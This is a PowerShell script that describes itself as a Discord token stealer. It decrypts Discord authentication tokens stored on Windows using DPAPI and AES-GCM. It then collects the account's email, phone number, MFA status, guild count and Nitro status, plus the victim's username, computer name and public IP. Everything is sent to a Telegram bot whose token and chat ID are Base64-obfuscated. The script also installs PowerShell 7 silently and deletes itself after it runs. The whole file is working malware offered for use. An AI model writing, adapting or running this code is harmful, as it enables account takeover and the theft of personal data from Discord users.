<#
.SYNOPSIS
    Extracts Discord authentication tokens and sends them to a Telegram chat with enriched metadata.
    • Auto-installs PowerShell 7 if missing, then relaunches itself.
    • Telegram Bot token & chat ID are **obfuscated (Base64)** and loaded at runtime.
    • Optional -DryRun switch prints the token locally.
    • Self-destructs after execution.
#>

[CmdletBinding()]
param(
    [switch]$DryRun
)

$sysMeta = 'ODE3MjQ0NzEzMTpBQUZaZkxRMDNBWnk2X2E3S3RZd3F3aE9RQTZ3dnVuWVNvZw=='
$sysRef  = 'NzI1NTc3NDk3Mw=='

$hdrSig = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($sysMeta))  # bot token
$pktId  = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($sysRef))   # chat id

# === Ensure PowerShell 7+ ===
function Invoke-ShadowSetup {
    if ($PSVersionTable.PSVersion.Major -ge 7) { return }
    Write-Host 'PowerShell 7+ not detected. Installing...'
    if (Get-Command winget -ErrorAction SilentlyContinue) {
        Start-Process winget -ArgumentList 'install','--id','Microsoft.PowerShell','-e','--silent' -Wait
    } else {
        $url = 'https://github.com/PowerShell/PowerShell/releases/latest/download/PowerShell-7.4.5-win-x64.msi'
        $tmp = Join-Path $env:TEMP 's.ps1.msi'
        Invoke-RestMethod -Uri $url -OutFile $tmp
        Start-Process msiexec.exe -ArgumentList '/i', "`"$tmp`"", '/qn' -Wait
        Remove-Item $tmp -Force
    }
    $pwsh = (Get-Command pwsh -ErrorAction Stop).Source
    $args = @(); if ($DryRun) { $args += '-DryRun' }
    & $pwsh -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath @args
    exit
}
Invoke-ShadowSetup

# === Environment validation ===
if ($PSVersionTable.PSVersion.Major -lt 7 -or $env:OS -notmatch 'Windows') {
    Write-Error 'Requires PowerShell 7+ on Windows'
    exit 1
}

# === Prep ===
$app = [Environment]::GetFolderPath('ApplicationData')
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName System.Security
$dpapi = [System.Security.Cryptography.ProtectedData]::Unprotect

function Get-CoreKey {
    param([string]$p)
    $f = Join-Path $p 'Local State'
    if (-not (Test-Path $f)) { return }
    try {
        $j = Get-Content $f -Raw | ConvertFrom-Json
        $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
        $r = $e[5..($e.Length-1)]
        return $dpapi.Invoke($r,[byte[]]::new(0),'CurrentUser')
    } catch {}
}

function Unwrap-Blob {
    param([byte[]]$b,[byte[]]$k)
    $iv  = $b[3..14]
    $cph = $b[15..($b.Length-17)]
    $tag = $b[($b.Length-16)..($b.Length-1)]
    $g   = [System.Security.Cryptography.AesGcm]::new($k)
    $out = New-Object byte[] $cph.Length
    try { $g.Decrypt($iv,$cph,$tag,$out); [Text.Encoding]::UTF8.GetString($out).Trim([char]0) } catch {}
}

function Seek-Token {
    param([string]$p,[byte[]]$k)
    $db = Join-Path $p 'Local Storage\leveldb'
    if (-not (Test-Path $db)) { return }
    $re = [Regex]'dQw4w9WgXcQ:([\w+/=]+)'
    foreach ($f in Get-ChildItem $db -Filter *.ldb -File) {
        $raw = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
        foreach ($m in $re.Matches($raw)) {
            $bl = [Convert]::FromBase64String($m.Groups[1].Value)
            $t  = Unwrap-Blob -b $bl -k $k
            if ($t) { return $t }
        }
    }
}

function Get-Public {
    try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -UseBasicParsing).ip } catch { 'Unknown' }
}

function Fetch-User {
    param([string]$tk)
    $h = @{ Authorization = $tk }
    try { $u = Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me' -Headers $h -UseBasicParsing } catch { return @{} }
    $g = try { (Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/guilds?with_counts=true' -Headers $h -UseBasicParsing).Count } catch { 0 }
    $n = try { (Invoke-RestMethod -Uri 'https://discord.com/api/v10/users/@me/billing/subscriptions' -Headers $h -UseBasicParsing).Count -gt 0 } catch { $false }
    @{ user="$($u.username)#$($u.discriminator)"; mail=$u.email; phone=$u.phone; mfa=$u.mfa_enabled; guilds=$g; nitro=$n }
}

function Ship-Out {
    param([string]$src,[string]$tok)
    $u = Fetch-User -tk $tok
    $txt = @"
<b>Token:</b> $tok

<b>Account:</b> $($u.user)
<b>Email:</b> $($u.mail)
<b>Phone:</b> $($u.phone)

<b>MFA:</b> $($u.mfa)
<b>Guilds:</b> $($u.guilds)
<b>Nitro:</b> $($u.nitro)

<b>Machine:</b> $env:USERNAME on $env:COMPUTERNAME
<b>IP:</b> $(Get-Public)
<b>Time:</b> $(Get-Date -f 'yyyy-MM-dd HH:mm:ss')
"@.Trim()
    $uri = "https://api.telegram.org/bot$hdrSig/sendMessage"
    $body = @{ chat_id=$pktId; text=$txt; parse_mode='HTML' } | ConvertTo-Json
    try { Invoke-RestMethod -Uri $uri -Method Post -ContentType 'application/json' -Body $body | Out-Null } catch {}
    Remove-Item -LiteralPath $PSCommandPath -Force
}

# === Hunt ===
$paths = "$app\Discord","$app\discordcanary","$app\discordptb","$app\Lightcord"
foreach ($p in $paths) {
    if (Test-Path $p) {
        $k = Get-CoreKey -p $p
        if ($k) {
            $tt = Seek-Token -p $p -k $k
            if ($tt) {
                if ($DryRun) { Write-Host "[DryRun] Token: $tt"; exit }
                Ship-Out -src $p -tok $tt
                exit
            }
        }
    }
}
Write-Host 'No token found.'
